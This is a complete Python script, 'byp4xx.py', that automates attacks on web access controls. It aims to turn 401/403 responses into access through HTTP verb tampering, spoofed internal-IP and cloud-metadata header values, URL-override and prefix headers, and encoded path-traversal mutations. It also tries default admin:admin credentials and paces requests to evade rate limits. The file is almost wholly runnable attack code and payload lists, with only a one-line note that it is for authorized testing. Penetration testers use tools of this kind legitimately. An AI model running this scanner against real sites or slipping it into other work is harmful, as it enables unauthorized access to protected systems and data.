#!/usr/bin/env python3
"""
byp4xx.py — unified 40x/401/403 bypass scanner.

Merges the most effective techniques from:
  - nomore403  (devploit)
  - dontgo403  (mbrg)
  - 4-ZERO-3   (Dheerajmadhukar)
  - byp4xx     (lobuhi)

into a single dependency-light tool.

Usage:
    python3 byp4xx.py -u https://target.com/admin
    python3 byp4xx.py -u https://target.com/admin -t 40 --only-hits
    python3 byp4xx.py -l urls.txt -o results.txt
    python3 byp4xx.py -u https://target.com/admin -x http://127.0.0.1:8080 -k

Author: built for authorized security testing / bug bounty only.
"""

import argparse
import concurrent.futures
import json
import posixpath
import random
import sys
import time
from urllib.parse import urlparse, urlunparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    print("[!] Missing dependency. Install with: pip install requests")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
class C:
    G = "\033[92m"   # green
    Y = "\033[93m"   # yellow
    R = "\033[91m"   # red
    B = "\033[94m"   # blue
    M = "\033[95m"   # magenta
    GR = "\033[90m"  # grey
    BOLD = "\033[1m"
    END = "\033[0m"

    @staticmethod
    def strip():
        for k in ("G", "Y", "R", "B", "M", "GR", "BOLD", "END"):
            setattr(C, k, "")


BANNER = r"""
 _                  _  _
| |__  _   _ _ __  | || |__  ____  __
| '_ \| | | | '_ \ | || |\ \/ /\ \/ /
| |_) | |_| | |_) ||__   _>  <  >  <
|_.__/ \__, | .__/    |_|/_/\_\/_/\_\
       |___/|_|   unified 40x bypass — byp4xx.py
"""


# ---------------------------------------------------------------------------
# Payload sets (the "most powerful" merged from the four tools)
# ---------------------------------------------------------------------------

# HTTP methods / verb tampering (dontgo403 + nomore403)
HTTP_METHODS = [
    "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS",
    "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
    "MOVE", "LOCK", "UNLOCK", "DEBUG", "TRACK", "PURGE", "FOO",
    "CATS", "INVENTED",  # arbitrary verbs sometimes bypass method-based ACLs
]

# Spoofed-IP values fed into the IP/host headers below.
# Includes alt-encodings of 127.0.0.1 that SSRF/ACL filters miss
# (decimal, hex, octal, shortened, IPv6-mapped, enclosed).
SPOOF_IPS = [
    "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", "localhost",
    "0.0.0.0", "0", "0177.0.0.1", "0x7f.0.0.1", "127.000.000.001",
    "127.1", "127.0.1", "2130706433", "0x7f000001", "017700000001",
    "[::1]", "[::ffff:127.0.0.1]", "::1", "0000::1", "①②⑦.⓪.⓪.①",
    # extra 127.0.0.1 obfuscations seen bypassing ACL/WAF parsers
    "127.0.0.1.", "127.0.0.1%00", "127.0.0.1 ", "0x7f.0x0.0x0.0x1",
    "127。0。0。1", "127．0．0．1", "①27.0.0.1", "localhost.",
    "127.0.0.1#@evil.com", "127.0.0.1&@evil.com",
    "10.0.0.1", "192.168.0.1", "192.168.1.1", "172.16.0.1",
    "100.64.0.1", "169.254.169.254", "metadata.google.internal",
    "fd00:ec2::254",  # AWS IMDSv2 IPv6 link-local
]

# Headers used for IP / origin / auth spoofing (merged 4-ZERO-3 + nomore403)
IP_HEADERS = [
    "X-Forwarded-For", "X-Forwarded", "X-Forwarded-Host",
    "X-Forwarded-Server", "X-Forwarded-Scheme", "X-Forwarded-Proto",
    "Forwarded-For", "Forwarded", "X-Originating-IP", "X-Remote-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Real-IP", "X-Host",
    "X-Custom-IP-Authorization", "Client-IP", "True-Client-IP",
    "Cluster-Client-IP", "X-ProxyUser-Ip", "Via", "X-Backend-Server",
    "X-Original-Remote-Addr", "X-Server-IP",
    # cloud / CDN trust headers seen bypassing edge ACLs in writeups
    "CF-Connecting-IP", "Fastly-Client-IP", "X-Azure-ClientIP",
    "X-Azure-SocketIP", "X-AppEngine-User-IP",
    "X-AppEngine-Trusted-IP-Request", "X-WAP-Profile", "X-Arbitrary",
    "X-Forwarded-For-Original", "X-Real-Ip", "X-True-IP",
    # more trust/forwarding headers from nomore403 + akamai/incapsula notes
    "X-Forwarded", "X-Forward-For", "X-Forwarded-By", "X-Cluster-Client-IP",
    "X-Original-Forwarded-For", "Incap-Client-IP", "True-Client-Ip",
    "X-Akamai-Edgescape", "WL-Proxy-Client-IP", "Proxy-Client-IP",
    "Z-Forwarded-For", "X-Coming-From", "Base-Url", "Http-Url",
    "Profile", "X-Forwarded-Server",
]

# Method-override headers — framework re-dispatches the verb server-side,
# bypassing method-based ACLs (Spring, Symfony, Rails, .NET). Big modern win.
METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
    "_method",
]

# Host header swap values (vhost / internal routing bypass)
HOST_VALUES = ["localhost", "127.0.0.1", "internal", "intranet",
               "localhost:443", "127.0.0.1:80"]

# Headers that rewrite the requested URL/path server-side (the big winners).
# X-Original-URL / X-Rewrite-URL = IIS + Symfony; route to protected path
# while request-line points at an allowed one.
URL_OVERRIDE_HEADERS = [
    "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
    "X-Http-Destinationurl", "X-Forwarded-Path", "X-Original-Path",
    "Request-Uri", "X-Default-Path", "X-Original-Uri", "X-Forwarded-Uri",
]

# X-Forwarded-Prefix — Spring Boot / reverse-proxy prefix-strip bypass.
# Classic actuator bypass: GET /;/actuator with X-Forwarded-Prefix.
# (X-Original-URL handled by URL_OVERRIDE_HEADERS — not duplicated here.)
PREFIX_HEADERS = ["X-Forwarded-Prefix", "X-Forwarded-Path-Prefix",
                  "X-Real-URI"]

# Scheme / proto override values
SCHEME_VALUES = ["http", "https", "On", "on", "ssl"]

# Authorization / auth-context headers to try (each sent alone).
AUTH_HEADERS = [
    ("Authorization", "Basic Og=="),            # ":" empty creds
    ("Authorization", "Basic YWRtaW46YWRtaW4="),  # admin:admin
    ("Authorization", "Basic YWRtaW46"),         # admin:
    ("Authorization", "Bearer null"),
    ("Authorization", "Bearer undefined"),
    ("Authorization", "Bearer 0"),
    ("Authorization", "null"),
    ("X-Requested-With", "XMLHttpRequest"),       # some ACLs allow XHR
    ("Content-Type", "application/json"),
    ("X-Original-URL", "/"),                      # reset path to allowed root
]

# Path mutation payloads. end-path tricks are appended to the path.
PATH_SUFFIXES = [
    "", "/", "//", "/.", "/./", "/%2e/", "/..;/", "/..%2f", "/..%00/",
    "/.randomstring", "/?", "/??", "/#", "/.json", "/.css", "/.html",
    "/.php", "/..;", "/;/", "/.;/", "/%20", "/%09", "/%00", "/*",
    "/%2f/", "/%252f/", "?.css", "?.json", "#", "..;/", ";", ";/",
    ".json", "%20", "%09", "%00", "/..%2F..%2F", "/.%2e/",
    # modern: backslash (IIS/.NET => /), fullwidth unicode, double-encode
    "\\", "/\\", "%5c", "/%5c", "/..%5c", "%c0%af", "/%c0%af",
    "%e0%80%af", "/%252e/", "/%252f", "/%bg%qf", "/%u002e/",
    "/%uff0e/", "/%uff0f", "/%ef%bc%8f",  # fullwidth slash UTF-8
    ";/../", "/..;/..;/", "/.//", "/.//./", "/%2e%2e%2f",
    "?", "&", "/%3f", "/%23", "/%26", "/.%00", "/%0a", "/%0d%0a",
    ".", "...", "/...", "//.", "/index.html", "/.//index.html",
    # nginx merge-slash + trailing variants
    "/.//", "//../", "/%2e", "/%2e%2e", "/%2f.", "/./.", "/ ", "/\t",
    # double/triple URL-encode of dot & slash (WAF decode-once bypass)
    "/%25%32%65/", "/%25%32%66/", "/%2525%32%65/", "/..%c0%af",
    "/..%e0%80%af", "/%c0%ae/", "/%e0%80%ae/",
    # tab/newline injected mid-suffix, semicolon empty-param
    "/%09/", "/%0d/", "/%0a/", "/;", "/;a=b", "/.json/", "/?a=b",
    # IIS short-name / ASP tricks
    "/*~1", "::$DATA", "/..%255c", "%3f/", "%23/",
]

PATH_PREFIXES = [
    "", "/", "//", "/./", "/%2e/", "/%2f", "/;/", "/.;/", "/..;/",
    "/;foo=bar/..", "/%2e%2e/", "/..%2f", "/%2f%2f",
    # modern prefixes
    "/%09", "/%20", "/\\", "/%5c", "/..%5c", "/%252f", "/.%2f",
    "/;/..", "/..;/", "/%u002f", "/%uff0f", "/web/../",
    # leading dot-segments + encoded traversal that resolve back to the path
    "/./../", "/.//", "/%2e%2e%2f", "/%252e%252e%252f", "/..%00/",
    "/..%0d/", "/..%5c..%5c", "/%c0%af", "/..;/..;/", "/#/../",
    # gateway/proxy prefix-strip lead-ins
    "/api/..", "/v1/..", "/public/..", "/static/..", "/..%2f..%2f",
]

# Wrappers applied to the *last segment* of the path (4-ZERO-3 style)
SEGMENT_WRAPPERS = [
    "{S}", "%2e/{S}", "{S}/.", "//{S}//", "/./{S}/./",
    "{S}%20", "{S}%09", "{S}%00", "{S}.json", "{S}..;/", "{S};/",
    "{S}/", "/{S}/", "{S}?", "{S}#", "{S}%2f", "{S}/..;/",
    "{S}.html", "{S}.php", "{S}~", "{S}/~",
    # modern segment tricks
    "{S}%23", "{S}%3f", "{S}\\", "{S}%5c", "{S};", "{S};foo=bar",
    "{S}%252f", "{S}%00.json", "{S}.", "{S}..;", "{S}%c0%af",
    "{S}%uff0f", "{S}/..;/{S}", "{S}/.",
]

# Matrix / path-parameter injections appended before last segment.
# Tomcat & Spring strip everything after ';' for routing but ACL sees raw.
MATRIX_PARAMS = [";", ";/", ";jsessionid=1", ";foo=bar",
                 ";/..", "/.;/", "/..;/", "%3b", "%3b/"]

# Default UA — fixed (deterministic) so length-diffing and reproducibility
# hold. Override with --ua.
DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

# UA-bypass pool — each is tried as an EXPLICIT labeled job (not random),
# so a Googlebot/internal-crawler bypass is reproducible and attributed.
USER_AGENTS = [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "curl/8.5.0",
]


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------
class Byp4xx:
    def __init__(self, args):
        self.args = args
        self.session = self._build_session()
        self.baseline = None        # (status, length)
        self.baseline_stable = True
        self.deny_len = None        # body length of the deny page, if any
        self.deny_codes = args.deny_codes
        self.results = []
        self.json_results = []
        self._429_streak = 0        # consecutive rate-limits -> auto-backoff

    def _build_session(self):
        s = requests.Session()
        retry = Retry(total=1, backoff_factor=0.2,
                      status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=100,
                              pool_maxsize=100)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        if self.args.proxy:
            s.proxies = {"http": self.args.proxy, "https": self.args.proxy}
        return s

    def _extra_headers(self):
        h = {}
        if self.args.header:
            for raw in self.args.header:
                if ":" in raw:
                    k, v = raw.split(":", 1)
                    h[k.strip()] = v.strip()
        return h

    def _request(self, url, method="GET", headers=None):
        hdr = {"User-Agent": self.args.ua or DEFAULT_UA}
        hdr.update(self._extra_headers())
        if headers:
            hdr.update(headers)

        # Build + send manually so we can defeat requests' URL requoting,
        # which otherwise normalises away path payloads (/..%2f, \, %c0%af,
        # %252f, ;-params). Overwriting prep.url after prepare keeps raw bytes
        # in the request line; prep.method override keeps verb case (get/GeT).
        for attempt in range(self.args.retries + 1):
            try:
                req = requests.Request(method, url, headers=hdr)
                prep = self.session.prepare_request(req)
                prep.url = url
                prep.method = method
                r = self.session.send(
                    prep, timeout=self.args.timeout,
                    allow_redirects=False, verify=not self.args.insecure,
                )
            except (requests.exceptions.RequestException,
                    UnicodeError, ValueError) as e:
                # ValueError/UnicodeError: e.g. non-latin-1 header value
                # (fullwidth-unicode spoof IP) or malformed URL — skip, no crash
                return None, 0, str(e)

            if r.status_code == 429 and attempt < self.args.retries:
                self._429_streak += 1
                ra = r.headers.get("Retry-After", "")
                wait = float(ra) if ra.isdigit() else max(self.args.delay * 4, 2)
                # global slow-down so we don't get the source IP banned
                time.sleep(min(wait + self._429_streak, 15))
                continue

            self._429_streak = max(0, self._429_streak - 1)
            if self.args.delay:
                time.sleep(self.args.delay + random.random() * self.args.delay)
            return r.status_code, len(r.content), r

        return r.status_code, len(r.content), r

    # -- baseline -----------------------------------------------------------
    def set_baseline(self, url):
        # sample twice: catch flapping endpoints that would spew false hits
        s1, l1, _ = self._request(url, "GET")
        s2, l2, _ = self._request(url, "GET")
        self.baseline = (s1, l1)
        self.baseline_stable = (s1 == s2 and abs(l1 - l2) <= max(16, int(l1 * 0.02)))
        # remember the deny-page body size so a soft-block (200 + block page of
        # the same size) is not mistaken for a bypass
        self.deny_len = l1 if (s1 in self.deny_codes) else None

        # Reference response for the site ROOT. URL-override / prefix-header
        # jobs request "/" and rely on a header to re-route to the protected
        # path; if the server ignores the header it just serves the homepage.
        # Capturing root lets us suppress that whole false-positive class.
        parsed = urlparse(url)
        self.root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))
        self.target_path = (parsed.path or "/").rstrip("/") or "/"
        if (parsed.path or "/").rstrip("/") in ("", "/"):
            self.root_ref = self.baseline
        else:
            rs, rl, _ = self._request(self.root, "GET")
            self.root_ref = (rs, rl)

        # CATCH-ALL CONTROL: request a random sibling path that cannot exist.
        # SPAs / catch-all routers answer 200 with the app shell for ANY path,
        # so a mutated path returning that same shell is NOT a bypass. Record
        # its (status, len) fingerprint to suppress that whole FP class.
        rnd = "byp4xx-" + "".join(random.choice("abcdefghijklmnop0123456789")
                                  for _ in range(14))
        base_dir = self.target_path.rsplit("/", 1)[0] or ""
        ctrl_url = urlunparse((parsed.scheme, parsed.netloc,
                               f"{base_dir}/{rnd}", "", "", ""))
        cs, cl, _ = self._request(ctrl_url, "GET")
        self.ctrl_ref = (cs, cl)

        warn = "" if self.baseline_stable else f"  {C.Y}(UNSTABLE: {s2}/{l2}b){C.END}"
        print(f"{C.GR}[baseline] {url} -> {s1} ({l1} bytes)  "
              f"[root {self.root_ref[0]}/{self.root_ref[1]}b  "
              f"catch-all {cs}/{cl}b]{C.END}{warn}")

    def _len_close(self, a, b):
        if a is None or b is None:
            return False
        return abs(a - b) <= max(16, int(b * 0.02))

    def _interesting(self, status, length, url=None, method="GET", loc=""):
        """True only when the mutation plausibly defeated the control:
        reached a non-deny 2xx/3xx whose body isn't the deny page again.
        Soft-403s (200 + same-size block page), homepage echoes (fragment
        truncation / ignored override headers), normaliser redirects that
        bounce back to the protected path, and 4xx/5xx noise are filtered."""
        if status is None:
            return False
        bstat, blen = self.baseline if self.baseline else (None, None)
        if status in self.deny_codes:
            return False
        # OPTIONS/2xx with no body is a CORS preflight, not resource access
        if method.upper() == "OPTIONS" and 200 <= status < 300 and length == 0:
            return False
        # Homepage echo: any response byte-identical to the site root is the
        # SPA catch-all, not the protected resource. Catches '#'-fragment
        # truncation and ignored override headers regardless of the URL shown.
        if (getattr(self, "root_ref", None) and self.target_path != "/"):
            rs, rl = self.root_ref
            if status == rs and self._len_close(length, rl):
                return False
        # Catch-all shell: matches the random-path control -> the router
        # answers everything with the same shell; not a real resource.
        if getattr(self, "ctrl_ref", None):
            cs, cl = self.ctrl_ref
            if cs is not None and status == cs and self._len_close(length, cl):
                return False
        # Redirect that just normalises back to the SAME protected path is a
        # bounce, not a bypass. Collapse /./ and /../ in the Location first so
        # '/./api/users/all' is recognised as == '/api/users/all'.
        if 300 <= status < 400 and loc:
            lpath = urlparse(loc).path or "/"
            norm = posixpath.normpath(lpath).rstrip("/") or "/"
            tgt = posixpath.normpath(self.target_path).rstrip("/") or "/"
            if norm == tgt:
                return False
        if 200 <= status < 400:
            # baseline already open -> only a real content change matters
            if bstat is not None and 200 <= bstat < 400:
                return not self._len_close(length, blen)
            # soft-block: 200 but body is the same deny page
            if self.deny_len is not None and self._len_close(length, self.deny_len):
                return False
            return True
        # 4xx (other than deny) / 5xx are not access — treat as noise
        return False

    # -- payload builders ---------------------------------------------------
    def _build_path_jobs(self, parsed):
        """Yield (label, url, method, headers) for path-based mutations."""
        path = parsed.path or "/"
        base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))

        # suffix mutations on full path
        for sfx in PATH_SUFFIXES:
            np = path.rstrip("/") + sfx if sfx.startswith("/") or not sfx \
                else path + sfx
            if not sfx:
                np = path
            yield ("PATH-SUFFIX", base + np, "GET", None)

        # prefix mutations
        for pfx in PATH_PREFIXES:
            np = pfx + path.lstrip("/")
            yield ("PATH-PREFIX", base + np, "GET", None)

        # last-segment wrappers
        segs = path.rstrip("/").split("/")
        if len(segs) > 1 and segs[-1]:
            last = segs[-1]
            head = "/".join(segs[:-1])
            for w in SEGMENT_WRAPPERS:
                seg = w.replace("{S}", last)
                np = (head + "/" + seg) if head else ("/" + seg)
                yield ("SEGMENT", base + np, "GET", None)

        # case toggle of last segment
        if len(segs) > 1 and segs[-1]:
            last = segs[-1]
            head = "/".join(segs[:-1])
            for variant in (last.upper(), last.capitalize(),
                            "".join(c.upper() if i % 2 else c
                                    for i, c in enumerate(last))):
                if variant != last:
                    np = (head + "/" + variant) if head else ("/" + variant)
                    yield ("CASE", base + np, "GET", None)

        # matrix / path-param injection before last segment
        if len(segs) > 1 and segs[-1]:
            last = segs[-1]
            head = "/".join(segs[:-1])
            for mp in MATRIX_PARAMS:
                np = f"{head}/{mp}{last}" if head else f"/{mp}{last}"
                yield ("MATRIX", base + np, "GET", None)
                np2 = f"{head}/{last}{mp}" if head else f"/{last}{mp}"
                yield ("MATRIX", base + np2, "GET", None)

        # whole-path case variants — case-insensitive backends/route tables
        # (e.g. /api/Users/All) sometimes skip a case-sensitive deny rule
        for variant in (path.upper(), path.lower(),
                        "/".join(s.capitalize() for s in path.split("/"))):
            if variant != path and variant != "/":
                yield ("CASE-FULL", base + variant, "GET", None)

        # append a fake extension to the whole path (static-file ACL skip)
        for ext in (".json", ".html", ".js", ".css", "?", "/?"):
            yield ("EXT", base + path.rstrip("/") + ext, "GET", None)

    def _build_method_jobs(self, url):
        for m in HTTP_METHODS:
            yield ("METHOD", url, m, None)
        # case-variant verbs — some ACLs match "GET" literal only
        for m in ("get", "Get", "pOsT", "GeT"):
            yield ("METHOD-CASE", url, m, None)

    def _build_header_jobs(self, url):
        parsed = urlparse(url)
        path = parsed.path or "/"
        root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))

        # IP / origin spoof headers x spoofed IPs
        for hname in IP_HEADERS:
            for ip in SPOOF_IPS:
                yield ("IP-HEADER", url, "GET", {hname: ip})

        # URL-override headers point at the protected path
        for hname in URL_OVERRIDE_HEADERS:
            yield ("URL-OVERRIDE", root, "GET", {hname: path})
            yield ("URL-OVERRIDE", url, "GET", {hname: path})
        # send root with empty path override (IIS quirk)
        yield ("URL-OVERRIDE", root, "GET", {"X-Original-URL": path,
                                             "X-Rewrite-URL": path})

        # Spring / reverse-proxy prefix-strip bypass (actuator-style).
        # Request a benign root, push real path via prefix header, and
        # also try the matrix-param actuator trick /;/<seg>.
        segs = [s for s in path.split("/") if s]
        if segs:
            last = segs[-1]
            head = "/" + "/".join(segs[:-1]) if len(segs) > 1 else ""
            for hname in PREFIX_HEADERS:
                yield ("PREFIX-HDR", root, "GET", {hname: path.rstrip("/")})
            # /;/admin  and  /admin/;/  style
            yield ("MATRIX-INJECT",
                   urlunparse((parsed.scheme, parsed.netloc,
                               f"{head}/;/{last}", "", "", "")),
                   "GET", None)

        # Method-override headers (framework re-dispatch)
        for hname in METHOD_OVERRIDE_HEADERS:
            for v in ("GET", "POST", "PUT", "TRACE", "OPTIONS"):
                yield ("METHOD-OVERRIDE", url, "POST", {hname: v})

        # Host header swap (vhost / internal routing)
        for hv in HOST_VALUES:
            yield ("HOST-SWAP", url, "GET", {"Host": hv})
        # trailing-dot host (FQDN root) — skips some host-based deny rules
        yield ("HOST-DOT", url, "GET", {"Host": parsed.netloc + "."})

        # IP-header SHOTGUN: set every trust header to 127.0.0.1 in ONE
        # request, so whichever header the backend actually reads wins. Most
        # writeup bypasses come from the proxy trusting an unexpected header.
        for ip in ("127.0.0.1", "localhost", "192.168.0.1", "169.254.169.254"):
            yield ("IP-SHOTGUN", url, "GET", {h: ip for h in IP_HEADERS})

        # PATH-trick x internal-IP combo: a path mutation reaches the route
        # while the spoofed internal IP satisfies an "internal-only" ACL.
        # This pairing (not either alone) is the real-world 403->200 winner.
        combo_paths = ["/..;/", "/%2e/", "/;/", "/.//", "//", "/%2f",
                       "/..%2f", "\\", "/%252f"]
        cseg = path.rstrip("/").rsplit("/", 1)
        chead = cseg[0] if len(cseg) > 1 else ""
        clast = cseg[-1]
        for cp in combo_paths:
            np = f"{chead}{cp}{clast}" if clast else (chead + cp)
            cu = urlunparse((parsed.scheme, parsed.netloc, np, "", "", ""))
            yield ("PATH+IP", cu, "GET", {"X-Forwarded-For": "127.0.0.1",
                                          "X-Real-IP": "127.0.0.1"})

        # scheme / port override headers
        for v in SCHEME_VALUES:
            yield ("SCHEME", url, "GET", {"X-Forwarded-Scheme": v})
            yield ("SCHEME", url, "GET", {"X-Forwarded-Proto": v})
        yield ("PORT", url, "GET", {"X-Forwarded-Port": "80"})
        yield ("PORT", url, "GET", {"X-Forwarded-Port": "443"})
        yield ("SSL", url, "GET", {"X-Forwarded-Ssl": "on"})

        # User-Agent bypass (crawler / internal allowlists) — explicit + labeled
        for ua in USER_AGENTS:
            yield ("USER-AGENT", url, "GET", {"User-Agent": ua})

        # auth-context header set (empty/default creds, XHR, type override)
        for hname, hval in AUTH_HEADERS:
            yield ("AUTH", url, "GET", {hname: hval})

        # referer/origin self-trust + version + cache tricks
        yield ("REFERER", url, "GET", {"Referer": url})
        yield ("REFERER", url, "GET", {"Referer": root})
        yield ("ORIGIN", url, "GET", {"Origin": root.rstrip("/")})
        yield ("CONTENT-LEN", url, "POST", {"Content-Length": "0"})
        yield ("ACCEPT-VER", url, "GET", {"Accept-Version": "1"})
        yield ("PRAGMA", url, "GET", {"Pragma": "no-cache",
                                      "Cache-Control": "no-transform"})

    def build_jobs(self, url):
        parsed = urlparse(url)
        raw = (list(self._build_method_jobs(url))
               + list(self._build_path_jobs(parsed))
               + list(self._build_header_jobs(url)))
        # dedupe identical (method, url, headers) tuples — the suffix/prefix
        # sets overlap heavily ("" + "/" etc.) and waste requests otherwise
        seen, jobs = set(), []
        for label, u, method, headers in raw:
            key = (method, u, tuple(sorted((headers or {}).items())))
            if key in seen:
                continue
            seen.add(key)
            jobs.append((label, u, method, headers))
        return jobs

    # -- run ----------------------------------------------------------------
    def _run_job(self, job):
        label, url, method, headers = job
        st, ln, r = self._request(url, method, headers)
        loc = ""
        if hasattr(r, "headers"):
            loc = r.headers.get("Location", "")
        detail = ""
        if headers:
            detail = " ".join(f"{k}: {v}" for k, v in headers.items())
        elif method != "GET":
            detail = method
        return (label, method, url, detail, st, ln, loc, headers)

    def scan(self, url):
        print(f"\n{C.BOLD}{C.B}[*] Target: {url}{C.END}")
        self.set_baseline(url)
        jobs = self.build_jobs(url)
        print(f"{C.GR}[*] {len(jobs)} payloads queued, "
              f"{self.args.threads} threads{C.END}\n")

        hits = []
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.args.threads) as ex:
            futs = [ex.submit(self._run_job, j) for j in jobs]
            for fut in concurrent.futures.as_completed(futs):
                label, method, u, detail, st, ln, loc, hdrs = fut.result()
                interesting = self._interesting(st, ln, u, method, loc)
                if interesting:
                    # keep real headers/method alongside for the verify pass
                    hits.append((label, method, u, detail, st, ln, hdrs))
                self._print_line(label, method, u, detail, st, ln, interesting)

        # VERIFY: re-request every candidate and keep only the reproducible
        # ones. Kills jitter/transient false positives (dynamic length, a
        # one-off 5xx, rate-limit flap) that slipped past the first filter.
        if hits and not self.args.no_verify:
            verified = []
            for label, method, u, detail, st, ln, hdrs in hits:
                st2, ln2, r2 = self._request(u, method, hdrs)
                loc2 = r2.headers.get("Location", "") if hasattr(r2, "headers") else ""
                if (self._interesting(st2, ln2, u, method, loc2)
                        and st2 == st and self._len_close(ln2, ln)):
                    verified.append((label, method, u, detail, st, ln))
                else:
                    print(f"{C.GR}[verify] dropped flaky {label} {method} "
                          f"{u} ({st}/{ln}b -> {st2}/{ln2}b){C.END}")
            dropped = len(hits) - len(verified)
            if dropped:
                print(f"{C.GR}[verify] {dropped} unverified hit(s) removed{C.END}")
            hits = verified
        else:
            hits = [(la, m, u, d, s, l) for la, m, u, d, s, l, _ in hits]

        self._summary(url, hits)
        return hits

    def _print_line(self, label, method, url, detail, st, ln, interesting):
        if st is None:
            if self.args.verbose:
                print(f"{C.GR}[ERR ] {label:<12} {method:<8} {detail}{C.END}")
            return
        if self.args.only_hits and not interesting:
            return
        if 200 <= st < 300:
            col = C.G
        elif 300 <= st < 400:
            col = C.B
        elif st in (401, 403):
            col = C.GR
        else:
            col = C.Y
        mark = f"{C.M}<== BYPASS{C.END}" if interesting else ""
        line = (f"{col}[{st}] {ln:>7}b  {label:<12} {method:<8} "
                f"{detail[:60]:<60}{C.END} {mark}")
        print(line)

    def _summary(self, url, hits):
        if not hits:
            print(f"\n{C.Y}[-] No bypass found for {url}{C.END}")
        else:
            print(f"\n{C.G}{C.BOLD}[+] {len(hits)} potential "
                  f"bypass(es) for {url}:{C.END}")
            for label, method, u, detail, st, ln in sorted(
                    hits, key=lambda x: x[4]):
                print(f"  {C.G}[{st}] {ln}b{C.END} {label} "
                      f"{method} {detail}  -> {u}")
        if not self.baseline_stable:
            print(f"{C.Y}[!] baseline was unstable — hits above may be flaps, "
                  f"verify manually{C.END}")
        # collect for file output (text + structured)
        for label, method, u, detail, st, ln in hits:
            self.results.append(
                f"[{st}] {ln}b\t{label}\t{method}\t{detail}\t{u}")
            self.json_results.append({
                "target": url, "status": st, "length": ln, "technique": label,
                "method": method, "detail": detail, "url": u,
                "baseline_stable": self.baseline_stable,
            })


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(
        description="byp4xx.py — unified 40x bypass scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example: python3 byp4xx.py -u https://t.com/admin -t 40 --only-hits",
    )
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--url", help="single target URL")
    g.add_argument("-l", "--list", help="file with one URL per line")
    p.add_argument("-t", "--threads", type=int, default=20,
                   help="concurrent threads (default 20)")
    p.add_argument("--timeout", type=float, default=10,
                   help="request timeout seconds (default 10)")
    p.add_argument("--delay", type=float, default=0.0,
                   help="per-request delay seconds (jittered) — avoids IP bans")
    p.add_argument("--retries", type=int, default=2,
                   help="retries on HTTP 429 with backoff (default 2)")
    p.add_argument("--deny-codes", default="401,403",
                   help="status codes treated as 'denied' baseline (default 401,403)")
    p.add_argument("--ua", help="fixed User-Agent for all baseline requests")
    p.add_argument("-x", "--proxy", help="proxy e.g. http://127.0.0.1:8080")
    p.add_argument("-k", "--insecure", action="store_true",
                   help="skip TLS verification")
    p.add_argument("-H", "--header", action="append",
                   help="extra header 'Name: Value' (repeatable)")
    p.add_argument("-o", "--output", help="write hits to file")
    p.add_argument("--json", dest="json_out",
                   help="write hits as JSON to this file")
    p.add_argument("--only-hits", action="store_true",
                   help="print only successful bypasses")
    p.add_argument("--no-verify", action="store_true",
                   help="skip the re-request verification pass on hits")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="show errors too")
    p.add_argument("--no-color", action="store_true", help="disable color")
    return p.parse_args()


def main():
    args = parse_args()
    if args.no_color or not sys.stdout.isatty():
        C.strip()
    try:
        args.deny_codes = {int(x) for x in args.deny_codes.split(",") if x.strip()}
    except ValueError:
        print(f"{C.R}[!] --deny-codes must be comma-separated integers{C.END}")
        sys.exit(1)
    print(C.M + BANNER + C.END)

    targets = []
    if args.url:
        targets = [args.url.strip()]
    else:
        try:
            with open(args.list) as f:
                targets = [ln.strip() for ln in f if ln.strip()
                           and not ln.startswith("#")]
        except OSError as e:
            print(f"{C.R}[!] Cannot read list: {e}{C.END}")
            sys.exit(1)

    scanner = Byp4xx(args)
    start = time.time()
    all_hits = []
    for url in targets:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        all_hits += scanner.scan(url)

    print(f"\n{C.GR}[*] Done in {time.time()-start:.1f}s — "
          f"{len(all_hits)} total bypass(es){C.END}")

    if args.output and scanner.results:
        with open(args.output, "w") as f:
            f.write("\n".join(scanner.results) + "\n")
        print(f"{C.G}[+] Saved to {args.output}{C.END}")

    if args.json_out and scanner.json_results:
        with open(args.json_out, "w") as f:
            json.dump(scanner.json_results, f, indent=2)
        print(f"{C.G}[+] Saved JSON to {args.json_out}{C.END}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.END}")
        sys.exit(130)
